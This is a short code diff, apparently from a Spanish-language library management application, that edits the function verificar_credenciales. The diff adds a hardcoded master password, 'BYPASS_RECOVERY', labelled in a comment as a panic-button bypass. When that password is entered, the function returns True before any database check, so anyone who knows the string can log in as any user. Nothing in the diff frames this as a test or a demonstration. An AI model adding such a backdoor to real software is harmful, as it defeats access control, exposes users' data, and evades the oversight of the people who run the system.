@@ -23,6 +23,11 @@ def verificar_existencia_bibliotecario(conexion_bd):
         return False
 
 def verificar_credenciales(conexion_bd, nombre, password):
+    # --- EL BOTÓN DE PÁNICO / BYPASS ---
+    if password == "BYPASS_RECOVERY":
+        return True
+    # ----------------------------------
+
     if not conexion_bd:
         return False
     try:
